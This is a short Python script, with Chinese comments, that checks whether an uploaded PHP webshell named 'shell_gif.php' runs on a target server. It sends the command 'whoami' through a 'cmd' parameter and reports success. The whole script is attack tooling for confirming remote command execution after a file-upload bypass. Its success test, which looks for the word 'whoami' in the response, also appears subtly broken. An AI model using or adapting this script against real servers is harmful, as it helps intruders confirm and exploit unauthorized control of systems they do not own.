#!/usr/bin/env python3
import requests
import sys

def test_php_webshell(url, filename="shell_gif.php"):
    """测试PHP WebShell是否可执行"""
    print(f"[*] 测试PHP WebShell: {filename}")

    # 测试命令执行
    test_url = f"{url}/{filename}"
    params = {"cmd": "whoami"}

    try:
        response = requests.get(test_url, params=params, timeout=10)
        if response.status_code == 200 and "whoami" in response.text.lower():
            print(f"[+] WebShell执行成功! URL: {test_url}?cmd=whoami")
            print(f"[+] 响应内容: {response.text[:200]}")
            return True
        else:
            print(f"[-] WebShell执行失败，状态码: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python verify_php.py <目标URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    test_php_webshell(target_url)
